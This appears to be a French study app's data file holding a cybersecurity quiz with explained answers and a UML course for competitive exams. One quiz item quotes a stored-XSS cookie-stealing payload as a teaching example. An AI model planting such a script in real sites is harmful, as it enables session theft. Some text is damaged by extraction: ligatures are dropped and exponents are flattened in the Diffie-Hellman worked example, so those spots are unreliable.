  2. Confondre    signature et chiffrement : signer = prouver l'auteur, pas cacher le contenu.
  3. Croire que HTTPS = «site sûr». HTTPS protège le canal, pas le contenu du site.

  4. Confondre    authentification et autorisation.
  5. MFA avec 2 mots de passe = PAS du MFA (même type de facteur «savoir»).

  6. Le filtrage d'entrées ne protège PAS contre les injections SQL (seules les requêtes préparées le
       font).

  7. MD5 et SHA-1 sont     cassés. Ne JAMAIS les utiliser pour la sécurité.
  8. Un    IDS ne bloque pas : il alerte seulement.
  9. Confondre DDoS (Déni de Service Distribué) et DoS (d'une seule source).

 10. Croire que le chiffrement seul garantit l'intégrité (il faut un MAC ou un mode authentifié comme
       GCM).`}],gh=[{q:`Un attaquant chiffre toutes les données d'une entreprise (ransomware).                 Quelle propriété de la
 triade CIA est principalement violée ?`,o:["Confidentialité","Intégrité","Disponibilité","Authenticité"],a:2,e:"Réponse : C) Disponibilité Un ransomware chiffre les données et les rend inaccessibles. La propriété violée est la disponi- bilité.  Confidentialité : les données ne sont pas divulguées (sauf si exfiltration)  Intégrité : les données sont modifiées (chiffrées) mais le but n'est pas la modification  Disponibilité : les données ne sont plus accessibles → violée ✓"},{q:`Quel      est   le   principal   inconvénient   du   chiffrement   symétrique   par   rapport   au   chiffrement
 asymétrique ?`,o:["Il est trop lent pour les communications en temps réel","Il nécessite un canal sécurisé pour échanger la clé","Il ne supporte pas l'authentification","Il n'est pas résistant au quantum"],a:1,e:"Réponse : B) L'inconvénient principal du chiffrement symétrique est le problème de distribution de clé : comment transmettre la clé secrète de manière sécurisée ?  A : Faux — le symétrique est rapide (c'est l'asymétrique qui est lent)  B : Vrai — c'est le problème clé du chiffrement symétrique ✓  C : Faux — HMAC permet l'authentification TLS résout ce problème : asymétrique pour échanger la clé symétrique, puis symétrique pour les données."},{q:"Pourquoi MD5 est-il considéré comme obsolète pour les usages cryptographiques ?",o:["Sa sortie est trop longue (128 bits)","Des collisions peuvent être calculées très rapidement","Il ne supporte pas le salage (salt)","Il est trop lent"],a:1,e:"Réponse : B) MD5 est cassé car des collisions (H(x) = H(y) avec x ̸= y ) peuvent être calculées en quelques secondes sur un ordinateur moderne. Sa sortie (128 bits) est trop petite selon les standards actuels.  SHA-256 (256 bits) est recommandé pour la sécurité  bcrypt/Argon2 pour les mots de passe (lent voulu)"},{q:"Dans RSA, si Alice veut chiffrer un message pour Bob, quelle clé utilise-t-elle ?",o:["La clé privée d'Alice","La clé publique d'Alice","La clé privée de Bob","La clé publique de Bob"],a:3,e:"Réponse : D) La clé publique de Bob En cryptographie asymétrique :  Chiffrement : on chiffre avec la clé publique du destinataire → seul Bob peut déchiffrer avec sa clé privée  Signature : on signe avec sa propre clé privée → tout le monde peut vérifier avec la clé publique du signataire"},{q:"Qu'est-ce que le   Perfect Forward Secrecy (PFS) dans TLS ?",o:["Une clé de session permanente réutilisée entre sessions","La compromission de la clé privée du serveur ne compromet pas les sessions passées","Un algorithme de chiffrement à clé symétrique","La vérification de l'integrité des paquets TLS"],a:1,e:"Réponse : B) Le PFS (Perfect Forward Secrecy) garantit que si la clé privée long-terme du serveur est compro- mise, les sessions passées ne peuvent pas être déchiffrées. Obtenu via ECDHE/DHE : clés éphémères générées pour chaque session et détruites après. TLS 1.3 impose le PFS (ECDHE obligatoire)."},{q:"Quelle est la méthode de protection la plus ecace contre les injections SQL ?",o:["Filtrer les caractères spéciaux (blacklisting)","Utiliser des requêtes préparées (Prepared Statements)","Changer le nom des tables de la base de données","Utiliser HTTPS pour les requêtes SQL"],a:1,e:"Réponse : B) Prepared Statements  A : Insusant — les blacklists sont incomplètes, contournables  B : La solution principale — sépare le code SQL des données utilisateur → le SQL est précompilé, les paramètres sont traités comme des données uniquement ✓  C : Obscurité (security through obscurity) — inecace  D : HTTPS ne protège pas contre les injections SQL"},{q:`Un attaquant stocke <script>alert(document.cookie)<\/script> dans un champ commentaire
d'un site. Quel type de XSS est-ce ?`,o:["Reflected XSS","Stored XSS (Persistent)","DOM-based XSS","CSRF"],a:1,e:"Réponse : B) Stored XSS (Persistent) Le script est sauvegardé en base de données et s'exécute pour chaque visiteur qui consulte le commentaire. C'est le plus dangereux car un seul attaque touche tous les utilisateurs.  Reflected : le script est dans l'URL, affecté uniquement si la victime clique sur ce lien  DOM-based : manipulation du DOM côté client, sans passer par le serveur  CSRF : différent — force des actions, pas d'injection de script"},{q:"Quelle protection est la plus ecace contre les attaques CSRF ?",o:["Chiffrer toutes les communications avec HTTPS","Utiliser des tokens CSRF uniques par formulaire/session","Valider les entrées utilisateur","Limiter les tentatives de connexion"],a:1,e:"Réponse : B) Tokens CSRF Un token CSRF est une valeur aléatoire unique liée à la session et incluse dans chaque formulaire. Le serveur vérifie sa présence — une page malveillante externe ne peut pas le connaître. Complément : l'attribut SameSite=Strict sur les cookies protège également."},{q:"Lors d'une attaque SYN Flood, l'attaquant :",o:["Envoie des paquets UDP en grande quantité","Envoie des paquets SYN sans jamais compléter le handshake TCP","Intercept les paquets entre client et serveur","Injecte des entrées malveillantes dans les requêtes HTTP"],a:1,e:"Réponse : B) Dans une attaque SYN Flood : 1. L'attaquant envoie des milliers de SYN (avec IP source usurpée) 2. Le serveur répond SYN-ACK et alloue des ressources (table SYN) 3. L'ACK final n'arrive jamais → les connexions half-open saturent la table 4. Plus de connexions légitimes possibles → DoS Protection : SYN cookies (ne stocke rien avant le ACK)."},{q:"Un certificat X.509 est signé par :",o:["La clé privée du propriétaire du certificat","La clé publique de l'autorité de certification (CA)","La clé privée de l'autorité de certification (CA)","La clé partagée entre le propriétaire et la CA"],a:2,e:"Réponse : C) La clé privée de la CA La CA signe le certificat avec sa clé privée. N'importe qui peut vérifier la signature avec la clé publique de la CA (préinstallée dans les navigateurs). Cela garantit que le certificat est bien émis par la CA de confiance et qu'il n'a pas été modifié."},{q:"Quelle différence principale distingue un   ver (worm) d'un virus ?",o:["Un ver chiffre les données, un virus les détruit","Un ver se propage seul sur le réseau sans fichier hôte, un virus s'attache à un fichier","Un ver vole des données, un virus ache des publicités","Un ver est détectable par antivirus, un virus non"],a:1,e:"Réponse : B)  Virus : doit s'attacher à un fichier/programme hôte pour se propager (nécessite une action utilisateur)  Ver : programme autonome qui se propage automatiquement sur le réseau, sans fichier hôte (exploite des vulnérabilités réseau)"},{q:"L'authentification   multi-facteurs (MFA) combine :",o:["Deux mots de passe différents","Deux facteurs de types différents (quelque chose que vous savez + avez + êtes)","Un MdP et une question secrète","Deux empreintes biométriques différentes"],a:1,e:"Réponse : B) La MFA combine des facteurs de types différents :  Savoir (knowledge) : MdP, PIN, questions  Avoir (possession) : token, smartphone, carte à puce  Être (inherence) : empreinte, iris, voix Deux mots de passe = deux facteurs du même type (savoir) → PAS de la MFA. MdP + question = deux facteurs «savoir» → PAS de la MFA. 12 | Examen Blanc 2 — Approfondissement root@cyber:~#"},{q:"Pourquoi le mode ECB (Electronic Codebook) est-il considéré comme dangereux ?",o:["Il est trop lent","Il n'utilise pas de vecteur d'initialisation","Deux blocs de texte identiques produisent des blocs chiffrés identiques (patterns visibles)","Il utilise une clé trop courte"],a:2,e:"Réponse : C) En mode ECB, chaque bloc est chiffré indépendamment. Si deux blocs de texte clair sont identiques, les blocs chiffrés le seront aussi. Cela révèle les patterns (ex: l'image du logo Linux chiffrée en ECB reste reconnaissable). Solution : utiliser CBC, CTR ou GCM (qui utilisent un IV ou un compteur)."},{q:`Un utilisateur accède à son profil via /user?id=42. En modifiant l'URL en /user?id=43, il voit
le profil d'un autre utilisateur. Cette vulnérabilité s'appelle :`,o:["SQL Injection","Path Traversal","IDOR (Insecure Direct Object Reference)","XSS"],a:2,e:"Réponse : C) IDOR IDOR (Insecure Direct Object Reference) : le serveur ne vérifie pas si l'utilisateur est autorisé à accéder à la ressource référencée. Protection : vérifier les droits d'accès côté serveur (authorisation) pour chaque requête."},{q:"Quelle différence fondamentale entre un firewall       stateless et stateful ?",o:["Le stateful est plus rapide","Le stateful suit l'état des connexions TCP et prend des décisions contextées","Le stateless inspecte le contenu des paquets applicatifs","Le stateful ne peut pas filtrer par port"],a:1,e:"Réponse : B)  Stateless : chaque paquet est traité indépendamment (IP/port seulement) — rapide mais basique  Stateful : maintient une table d'état des connexions actives — peut détecter des anomalies (ex: paquet ACK sans SYN précédent) ✓  NGFW : inspection applicative (couche 7), IPS intégré"},{q:`En cas de violation de données personnelles, le RGPD exige une notification à l'autorité compé-
tente sous :`,o:["24 heures","48 heures","72 heures","7 jours"],a:2,e:"Réponse : C) 72 heures L'article 33 du RGPD exige la notification à l'autorité de contrôle ( CNIL en France, CNDP au Maroc) dans les 72 heures suivant la prise de connaissance de la violation. Si la violation présente un risque élevé pour les individus, ceux-ci doivent également être informes «dans les meilleurs délais»."},{q:`Dans l'échange de clés Die-Hellman, si les paramètres publics sont p = 23, g = 5, Alice choisit
a = 6 et Bob choisit b = 15. Quelle est la clé partagée ?`,o:["2","10","2 ou 10","8"],a:0,e:"Réponse : A) 2  Alice envoie : A = 56 (mod 23) = 15625 (mod 23) = 8  Bob envoie : B = 515 (mod 23) = 30517578125 (mod 23) = 19  Clé d'Alice : K = 196 (mod 23) = 47045881 (mod 23) = 2  Clé de Bob : K = 815 (mod 23) = 35184372088832 (mod 23) = 2 Clé commune = 2 = g ab (mod p) = 590 (mod 23)"},{q:"À quoi sert le   sel (salt) dans le hachage de mots de passe ?",o:["À accélérer le calcul du hash","À rendre le hash plus court","À empêcher les attaques par Rainbow Tables et rendre unique chaque hash","À chiffrer le hash final"],a:2,e:"Réponse : C) Le salt est une valeur aléatoire unique ajoutée à chaque mot de passe avant hachage.  Empêche les Rainbow Tables (tables pré-calculées hash → MdP)  Deux utilisateurs avec le même MdP ont des hashs différents (car salt différent)  Format typique : hash(salt + password) ou bcrypt(password, salt)  Le salt est stocké en clair avec le hash (pas besoin de le cacher)"},{q:"Quelle est la différence principale entre un IDS et un IPS ?",o:["L'IDS analyse les journaux, l'IPS analyse le trafic réseau","L'IDS détecte et alerte (passif ), l'IPS détecte et bloque (actif )","L'IDS est plus performant que l'IPS","L'IPS est utilisé uniquement pour les réseaux sans fil"],a:1,e:"Réponse : B) IDS IPS Mode Passif (monitoring) Actif (inline) Réaction Alerte uniquement Bloque le trafic Risque Faux négatifs Faux positifs (blocage légitime) Un faux positif dans un IPS peut bloquer du trafic légitime, ce qui est un risque à considérer."},{q:`Dans quel type de test d'intrusion le testeur dispose-t-il d'une connaissance complète de
l'architecture et du code source ?`,o:["Black Box","Grey Box","White Box","Red Team"],a:2,e:"Réponse : C) White Box  White Box : connaissance totale (code source, architecture, credentials) — le plus complet  Grey Box : connaissance partielle (compte utilisateur, documentation)  Black Box : aucune connaissance (simule un attaquant externe)  Red Team : simulation d'APT réaliste (sans limites strictes de périmètre)"},{q:"L'attribut HttpOnly sur un cookie empêche :",o:["La transmission du cookie en HTTP non-chiffré","L'accès au cookie depuis JavaScript (protection XSS)","L'envoi du cookie vers des sites tiers (protection CSRF)","L'expiration du cookie"],a:1,e:"Réponse : B) Attributs de cookies importants :  HttpOnly : cookie inaccessible depuis JavaScript (→ protège contre XSS) ✓  Secure : transmis uniquement sur HTTPS (protège contre écoute)  SameSite=Strict/Lax : empêche l'envoi cross-site (protège contre CSRF)  Expires/Max-Age : durée de vie du cookie"},{q:"HSTS (HTTP Strict Transport Security) protège contre :",o:["Les injections SQL","Le dégradement vers HTTP (SSL Stripping)","Les attaques DDoS","Les cookies non sécurisés"],a:1,e:"Réponse : B) SSL Stripping HSTS : le serveur indique au navigateur de n'utiliser que HTTPS pour ce domaine pendant une durée spécifiée. Header : Strict-Transport-Security: max-age=31536000; includeSubDomains Si un attaquant tente de dégrader la connexion vers HTTP (SSL Stripping), le navigateur refusera et forcera HTTPS."},{q:"Quelle est la meilleure définition d'un «Zero-day» ?",o:["Une vulnérabilité corrigée le jour de sa découverte","Une vulnérabilité inconnue du fabricant, sans correctif disponible","Une attaque qui se produit à minuit","Un exploit ayant mis 0 jour à se propager"],a:1,e:"Réponse : B) Un Zero-day est une vulnérabilité qui :  Est inconnue du fabricant/ 'editeur  N'a donc pas de correctif disponible («0 jour» pour se protéger)  Est extrêmement précieuse pour les attaquants (impossible à corriger)"}],Q2={id:ph,name:mh,color:fh,sections:hh,quiz:gh},W2=Object.freeze(Object.defineProperty({__proto__:null,color:fh,default:Q2,id:ph,name:mh,quiz:gh,sections:hh},Symbol.toStringTag,{value:"Module"})),vh="uml",yh="UML",xh="#f472b6",Sh=[{id:"1.1",c:1,t:"Qu'est-ce qu'UML ?",x:`❖ Définition
 UML (Unified Modeling Language) n'est pas une méthode, ni un processus, ni un langage de
 programmation. C'est un langage de modélisation graphique normalisé par l'OMG (Object
 Management Group).
  Objectif : spécifier, concevoir, visualiser et documenter les systèmes logiciels orientés objet.
  UML résulte de la fusion des travaux de Booch, Rumbaugh (OMT) et Jacobson (OOSE) dans
     les années 90.
  Version actuelle majeure : UML 2.x (actuellement UML 2.5).`},{id:"1.2",c:1,t:"Les 14 Diagrammes d'UML 2",x:`➔ Résumé rapide Classification des diagrammes UML
 UML 2 définit 14 types de diagrammes répartis en 2 grandes familles :

 1. Diagrammes Structurels (statiques) - "Ce qui compose le système" :
     Diagramme de Classes : briques de base de l'application
     Diagramme d'Objets : instances de classes à un instant T
     Diagramme de Composants : organisation des modules logiciels
     Diagramme de Déploiement : répartition matérielle
     Diagramme de Paquetages : organisation en dossiers/espaces de noms
     Diagramme de Structure composite : architecture interne d'une classe complexe
     Diagramme de Profils : extension d'UML
 2. Diagrammes Comportementaux (dynamiques) - "Ce que fait le système" :
     Diagramme de Cas d'utilisation : interactions entre système et acteurs (besoins)
     Diagramme d'Activité : flux d'exécution, algorithmique
     Diagramme d'États-transitions : cycle de vie d'un objet réactif
     Diagrammes d'Interaction :
        — Diagramme de Séquence : chronologie des messages entre objets
        — Diagramme de Communication : réseau d'objets (ex-collaboration UML 1)
        — Diagramme de Temps (Timing) : contraintes temporelles strictes
        — Diagramme de Vue d'ensemble des interactions : mix Séquence/Activité

 ★   Astuce Concours
 Au concours, il faut impérativement connaître le rôle principal des diagrammes majeurs. Retenez
 surtout :   Cas d'utilisation (exigences), Classes (structure POO), Séquence (scénarios), États
 (cycle de vie), Activité (logique métier complexe).

         Part II

Modélisation des Besoins

      2|            Diagramme des Cas d'Utilisation`},{id:"2.1",c:2,t:"Concepts généraux",x:`❖ Définition
                                    Use Case Diagram) permet de représenter le comportement
 Le diagramme des cas d'utilisation (
 du système du point de vue de l'utilisateur. Il délimite le frontière du système.

 ➣   Formalisme UML Les éléments
  Acteur : représenté par un "bonhomme" (stickman). Représente un rôle joué par un utilisa-
   teur, un matériel ou un autre système qui interagit avec le système modélisé.
          — Acteur principal : initie le cas d'utilisation (à gauche)
          — Acteur secondaire : sollicité par le système pour réaliser une tâche (à droite, ex: système
            bancaire externe)
  Cas d'utilisation : représenté par une ellipse.        Décrit une fonctionnalité (action) complète
   apportant une valeur à l'acteur. Toujours formulé avec un      verbe à l'infinitif (ex: "Retirer de
   l'argent").
  Frontière du système : représentée par un rectangle englobant les cas d'utilisation.`},{id:"2.2",c:2,t:"Les relations",x:`❖ Définition
 Il existe plusieurs relations dans un diagramme de cas d'utilisation :
     1. Association (trait continu) : relie un acteur à un cas d'utilisation (communication).
     2. Inclusion include : Le cas A inclut TOUJOURS le cas B. Le cas B est indispensable
          pour que A se termine.
           Flèche en pointillés de A (incluant) vers B (inclus).
           Exemple : "Retirer argent" ..include..> "S'authentifier".
     3. Extension extend : Le cas B PEUT (optionnellement ou sous condition) étendre le
          comportement de A.
              Flèche en pointillés de B (extension) vers A (cas de base).
              Le point où l'extension s'insère est appelé point d'extension.
              Exemple : "Imprimer ticket" ..extend..> "Retirer argent".
     4.   Généralisation : Héritage entre acteurs ou entre cas d'utilisation.
             Flèche avec pointe triangulaire fermée et vide, vers le général.
              Exemple : "Payer par CB" hérite de "Payer".
              Exemple : "Administrateur" hérite de "Utilisateur".

 ☞   Attention / Piège
 Sens des flèches include et extend :
      Le include pointe VERS ce dont on a BESOIN.
      Le extend pointe VERS le cas de BASE qui est étendu.
 C'est la question piège classique des concours !

              Part III

Modélisation Structurelle (Statique)

       3|            Diagramme de Classes`},{id:"3.1",c:3,t:"Structure d'une classe",x:`❖ Définition
 Le   diagramme de classes est le pilier d'UML. Il représente la structure statique du système.
 Une classe est représentée par un rectangle divisé en 3 compartiments :
      1.   Nom de la classe : en gras, centrré. Majuscule initiale. (En italique si la classe est
           abstraite).
      2.   Attributs : les données (propriétés).
      3.   Opérations (Méthodes) : les comportements.

 ➣    Formalisme UML Visibilité et typage
 Visibilité :
  + (Public) : visible par toutes les classes.
  - (Private) : visible uniquement par la classe elle-même (Encapsulation).
  # (Protected) : visible par la classe et ses sous-classes (héritage).
  ~ (Package) : visible par les classes du même package.
 Format des attributs :
 visibilité nomAttribut : type = valeurInitiale
 Exemple : - solde : double = 0.0
 Format des opérations :
 visibilité nomMethode(param1 : type) : typeRetour
 Exemple : + deposer(montant : double) : void
 Mots-clés :
       Souligné : attribut ou opération statique (de classe).
       Italique : classe ou méthode abstraite.`},{id:"3.2",c:3,t:"Relations entre classes",x:`❖ Définition
 1. Association (trait plein) : Relation structurelle classique. Peut être :
     Unidirectionnelle (flèche d'un côté) ou bidirectionnelle (pas de flèche).
     On y indique le nom de l'association, le sens de lecture (▶), les rôles et les multiplicités.
 2. Multiplicités (Cardinalités) :
       1 : Exactement un
       0..1 : Zéro ou un (optionnel)
       * ou 0..* : Zéro ou plusieurs (pas de limite)
       1..* : Au moins un
 Astuce Merise vs UML : En UML, la multiplicité se lit "à l'envers" de Merise.       Si Client est
 relié à Commande par une multiplicité 1..* côté Commande, cela signifie : "Un Client a 1..*
 Commandes".

                                                                      3.3.    CLASSES SPÉCIFIQUES

 ❖   Définition
 3. Agrégation (Losange VIDE côté conteneur) : Relation de type "composé de", mais avec un
 couplage faible. Le composant peut exister sans le composite.
 Ex: Une Equipe (losange) et des Joueurs. Si l'équipe est dissoute, les joueurs existent toujours.

 4. Composition (Losange PLEIN/NOIR côté conteneur) : Relation de type "composé de" avec
 fort couplage (destruction synchrone). Si le conteneur est détruit, le contenu est détruit. Le
 cycle de vie est lié. (Multiplicité côté composé : toujours 1 ou 0..1).
 Ex: Un Batiment (losange noir) et des Pieces. Si on détruit le bâtiment, les pièces n'existent plus.

 5. Généralisation / Héritage (Flèche au bout triangulaire VIDE) : Relation "est un". De la
 sous-classe (fille) vers la super-classe (mère).
 6. Dépendance (Flèche en pointillés) : Couplage très faible. La modification d'une classe peut
 affecter l'autre. Souvent utilisé quand une classe passe en paramètre d'une méthode d'une autre
 classe.`},{id:"3.3",c:3,t:"Classes spécifiques",x:`➣ Formalisme UML
  Classe Association : Associée à une relation avec un trait en pointillés. Elle porte les attributs
     de la relation (comme dans un schéma E/A n:n).
  Interface : Classe dont toutes les méthodes sont abstraites.
     — Formalisme 1 : interface au-dessus du nom.
     — Formalisme 2 : Représentée par un petit cercle ("sucette" ou "lollipop").
     — La réalisation (implémentation) est notée par une flèche d'héritage en pointillés.
  Énumération : enumeration. Liste de valeurs littérales constantes.

     4|          Diagramme d'Objets

❖    Définition
Le   diagramme d'objets est une instance du diagramme de classes à un instant 't'. Il illustre
un scénario ou des exemples de données.

➣    Formalisme UML
 L'objet est représenté par un rectangle.
 Le nom de l'objet est souligné sous la forme : nomObjet : NomDeClasse.
 Les attributs se voient affecter des valeurs (ex: solde = 500).
 Il n'y a pas de multiplicités (puisque c'est une instance réelle).
 Les relations (instances d'associations) sont appelées liens.

        Part IV

Modélisation Dynamique

  (Comportementale)

      5|          Diagramme de Séquence`},{id:"5.1",c:5,t:"Objectif et Structure",x:`❖ Définition
 Le   diagramme de séquence représente l'interaction (échange de messages) entre les objets au
 cours du temps (l'axe vertical représente le temps).

 ➣    Formalisme UML Les composants
  Ligne de vie (Lifeline) : ligne verticale en pointillés descendante d'un objet ou acteur.
  Bande d'activation (Execution Occurrence) : rectangle superposé sur la ligne de vie
     indiquant quand l'objet est actif/exécute du code.
  Types de Messages :
       — Message Synchrone (flèche avec pointe PLEINE) : l'émetteur bloque en attendant le
          retour. (Typique des appels de méthode).
       — Message Asynchrone (flèche avec pointe OUVERTE) : l'émetteur n'attend pas la
          réponse (threads, signaux).
       — Message de Retour (flèche en POINTILLÉS) : réponse d'un appel synchrone.
       — Message Réflexif : l'objet s'envoie un message à lui-même (boucle sur sa bande
          d'activation).
       — Message de Création : pointe vers la boîte de l'objet, surmonté du stéréotype create.
       — Destruction : une grande croix (X) à la fin de la ligne de vie.`},{id:"5.2",c:5,t:"Fragments Combinés (Opérateurs d'interaction)",x:`★ Astuce Concours
 UML 2 a introduit les cadres de fragments combinés pour modéliser la logique algorithmique (if,
 loops) dans un diagramme de séquence.

 ➔    Résumé rapide Principaux opérateurs
  Opérateur         Sens                                                       Équivalent programmation
  alt (Alternative) Choix mutuellement exclusif avec des gardes [condition]    if / else if / else
  opt (Option)      S'exécute SEULEMENT si [condition] est vraie               if (sans else)
  loop (Boucle)     Répétition tant que [condition] est vraie                  while / for
  par (Parallèle)   Exécution concurrente / simultanée                         Threads
  ref (Référence) Appel d'un autre diagramme de séquence externe               Appel de fonction
  break (Rupture) Sortie de bloc si condition vraie                            break ou exceptions

     6|          Diagramme d'Activité

❖    Définition
Le   diagramme d'activité décrit la logique séquentielle et parallèle (algorithme, processus
métier).    Il est souvent utilisé pour décrire les flux d'un cas d'utilisation ou l'intérieur d'une
méthode complexe.

➣    Formalisme UML
 N÷ud initial : un cercle plein (noir).
 Action (Activité) : rectangle aux coins très arrondis (oblong).
 Flot de contrôle : flèche reliant deux actions.
 N÷ud de décision / Choix : un losange vide (ex: if-else). Les flèches sortantes ont des
  gardes (conditions entre crochets [solde > 0]).
 N÷ud de fusion (Merge) : un losange vide rassemblant des chemins alternatifs.
 Bifurcation (Fork) : une grosse barre noire épaisse séparant un flux en plusieurs flux parallèles
    (concurrence).
 Synchronisation (Join) : une grosse barre noire réunissant des flux parallèles (attend que
    tous arrivent).
 N÷ud final : un cercle plein entouré d'un cercle vide (cible). Termine tout le processus.
 Fin de flux : cercle avec une croix (X). Termine un chemin particulier, pas tout le processus.
 Couloirs (Swimlanes) : partition verticale ou horizontale délimitant "qui fait quoi" (respon-
    sabilité).

    7|             Diagramme d'États-Transitions

❖   Définition
Ce diagramme représente l'automate à états finis (cycle de vie) d'une   instance particulière (un
objet réactif ).

➣   Formalisme UML
 État : rectangle à coins arrondis. L'objet est dans cet état pdt une durée.
    — entry / action : action exécutée à l'entrée de l'état.
    — do / action : activité continue pendant l'état.
    — exit / action : action exécutée en quittant l'état.
 Transition : flèche entre deux états.
 Syntaxe d'une transition : événement [garde] / action
     — événement : ce qui déclenche la transition (ex: clic, timeout, message).
     — [garde] : condition booléenne (ex: [x>5]). Si fausse, la transition ne se fait pas malgré
        l'événement.
     — / action : traitement instantané réalisé lors du franchissement (ex: / MAJ_BDD()).

            Part V

Architecture et Autres Concepts

      8|         Composants et Déploiement`},{id:"8.1",c:8,t:"Diagramme de Composants",x:`❖ Définition
 Le   diagramme de composants représente les modules logiciels indépendants et déployables,
 ainsi que leurs dépendances.

 ➣    Formalisme UML
  Composant : rectangle avec l'icône de composant (petit rectangle avec deux dents à gauche)
   ou le mot-clé component.
  Interface fournie (Provided) : cercle ("sucette" / lollipop) au bout d'un trait. Le composant
   offre ce service.
  Interface requise (Required) : demi-cercle (arc / socket) au bout d'un trait. Le composant
   a besoin de ce service pour fonctionner.
  Assemblage : la "sucette" rentre dans le "socket" (ball-and-socket).`},{id:"8.2",c:8,t:"Diagramme de Déploiement",x:`❖ Définition
 Le   diagramme de déploiement montre la topologie physique du matériel (n÷uds) sur lequel
 s'exécutent les composants logiciels.

 ➣    Formalisme UML
  N÷ud (Node) : cube en 3D représentant une ressource matérielle (serveur, PC, smartphone,
   routeur) ou un environnement d'exécution (JVM, conteneur Docker).
  Artéfact (Artifact) : le fichier physique déployé (ex: .jar, .war, .dll, base de données). Se
   place   à l'intérieur des n÷uds.
  Chemin de communication : ligne entre n÷uds (ex: LAN, TCP/IP, HTTPS).

    9|           Contraintes et Design Patterns`},{id:"9.1",c:9,t:"OCL (Object Constraint Language)",x:`❍ Note
 OCL est un langage formel associé à UML permettant d'exprimer des contraintes métier complexes
 que le diagramme ne peut pas dessiner.
     Invariants (inv:) : condition toujours vraie (ex: l'age d'une personne > 0).
     Pré-conditions (pre:) : vrai AVANT l'exécution d'une méthode.
     Post-conditions (post:) : vrai APRÈS l'exécution d'une méthode.`},{id:"9.2",c:9,t:"Lien UML et Patrons de conception (GoF)",x:`★ Astuce Concours
 Aux concours, on mêle souvent UML et Design Patterns. Retenez :
     Singleton : diagramme de classes → attribut statique privé (instance), constructeur privé,
      méthode + getInstance() statique.
     Strategy : une classe Contexte utilise une relation d'agrégation vers une Interface
      Strategie. Les algos implémentent l'interface.
     Observer : le Sujet gère une liste (1..*) d'Observateur.
     Composite : une classe implémente une Interface ET possède une agrégation (1..*) vers
      cette   même interface (récursivité).

    Part VI

Examens Blancs

     10 | Examen Blanc — UML`},{id:"12.1",c:12,t:"Explications des diagrammes UML",x:`❍ Note Diagramme de Classes – Comment lire
 Structure d'une classe :
     1er compartiment : Nom de la classe (en italique si abstraite).
     2ème compartiment : Attributs (visibilité nom : type = valeur).
     3ème compartiment : Opérations/Méthodes (visibilité nom(param) : type_retour).
 Visibilité :
      + : Public (visible partout)
      - : Private (visible uniquement dans la classe)
      # : Protected (visible dans la classe et ses enfants)
      ~ : Package (visible dans le même paquetage)

 ❍   Note Relations – Agrégation vs Composition
                   Agrégation (Losange vide) Composition                     (Losange
                                             plein)
                   Lien faible ("a un")                   Lien fort ("est composé de")
                   Si le parent meurt,    l'enfant        Si le parent meurt,   l'enfant
                   survit.                                meurt.
                   Ex : Voiture ♢– Passager               Ex : Voiture ♦– Moteur

 Règle d'or : Le losange se place TOUJOURS du côté du conteneur (le "tout").

 ❍   Note Cas d'utilisation – Include vs Extend
      include (Inclusion) : Comportement obligatoire. Le cas de base ne peut pas fonc-
       tionner sans l'inclusion.
         — Flèche en pointillés orientée vers le cas inclus.
      extend (Extension) : Comportement optionnel ou sous condition.
         — Flèche en pointillés orientée vers le cas de base. (Attention au sens inverse de include
            !)`},{id:"12.2",c:12,t:"Définitions UML à mémoriser",x:`❖ Définition Glossaire UML

   Terme                       Définition
   UML                         Unified Modeling Language. Langage          graphique de modélisation
                               standardisé.

                                                 12.3.   RÈGLES FONDAMENTALES À MÉMORISER

   Acteur                      Entité externe (utilisateur, système) interagissant avec le système
                               à l'étude.
   Scénario                    Une séquence d'actions spécifique d'un cas d'utilisation (réussite
                               ou échec).

   Polymorphisme               Capacité à traiter un objet comme une instance de sa superclasse.
   Classe Abstraite            Classe non instanciable (nom en italique).          Sert de base pour
                               l'héritage.
   Interface                   Contrat de méthodes sans implémentation (mot-clé interface).

   Ligne de vie                En séquence, la ligne pointillée verticale représentant la durée de
                               vie d'un objet.
   Message synchrone           L'émetteur attend la réponse (flèche à bout plein).
   Message asynchrone          L'émetteur n'attend pas de réponse (flèche à bout ouvert).

   Activité                    Comportement        modélisé   par   un   flux   d'actions   (diagramme
                               d'activité).
   N÷ud de décision            Losange dans le diag.       d'activité modélisant un choix (gardes
                               mutuellement exclusives).
   Fork / Join                 Barre noire pour séparer (Fork) ou synchroniser (Join) des flux
                               parallèles.`},{id:"12.3",c:12,t:"Règles fondamentales à mémoriser",x:`★ Astuce Concours 20 règles d'or UML
    1. UML n'est pas une méthode de travail, c'est un langage visuel de modélisation.
    2. Ne JAMAIS relier deux acteurs ensemble dans un diagramme de cas d'utilisation.
    3. Ne JAMAIS relier deux cas d'utilisation par une association simple (utiliser include/extend
         ou généralisation).
    4. La flèche d'héritage (généralisation) pointe toujours vers le      parent (la superclasse).
    5. Les multiplicités en UML se lisent "en regardant" l'autre classe.
    6. Une classe d'association a souvent pour clé primaire la concaténation des clés des classes
         liées (en BD).
    7. Dans un diagramme de séquence, le temps s'écoule de haut en bas.
    8. Le premier message d'un diagramme de séquence provient souvent d'un acteur externe à
         gauche.
    9. Bande d'activation (rectangle sur la ligne de vie) = période pendant laquelle l'objet exécute
         une action.
   10.   alt = IF/ELSE (choix mutuellement exclusif ). opt = IF sans ELSE. loop = boucle.
   11. Un diagramme d'états-transitions modélise la vie d'      un seul objet (et non de tout le sys-
         tème).
   12. Un état initial est plein noir. Un état final est un rond avec un point noir (cible).
   13. Une transition est déclenchée par un   événement [condition/garde] / action.
   14. Le losange plein de la composition indique la responsabilité de création et destruction.
   15. En Java/C++, l'héritage est traduit par extends / :          public.
   16. L'inclusion include réduit la redondance ; l'extension extend gère les exceptions.
   17. L'acteur principal est généralement placé à gauche, l'acteur secondaire (système sollicité) à
         droite.
   18. create indique qu'un message instancie un nouvel objet.
   19. destroy() (croix en bas de la ligne de vie) modélise la mort de l'objet.
   20. Le diagramme de classes est structurel (statique). Le diagramme de séquence est comporte-
         mental (dynamique).

                                                          12.4.   PIÈGES FRÉQUENTS AU CONCOURS`},{id:"12.4",c:12,t:"Pièges fréquents au concours",x:`☞ Attention / Piège 10 pièges classiques UML
      1. Inverser la flèche de extend : elle doit pointer du cas d'extension      vers le cas de base !
      2. Inverser la flèche d'héritage (elle pointe vers le père, pas le fils).
      3. Placer le losange d'agrégation/composition du côté des enfants au lieu du conteneur.
      4. Confondre "Message Asynchrone" (demi-flèche) et "Message de retour" (flèche pointillée).
      5. Mettre des méthodes/actions dans un diagramme de cas d'utilisation (les CU décrivent LE
         QUOI, pas le COMMENT).
      6. Oublier la multiplicité par défaut si elle n'est pas écrite (souvent considérée comme 1, mais
         mieux vaut la préciser).
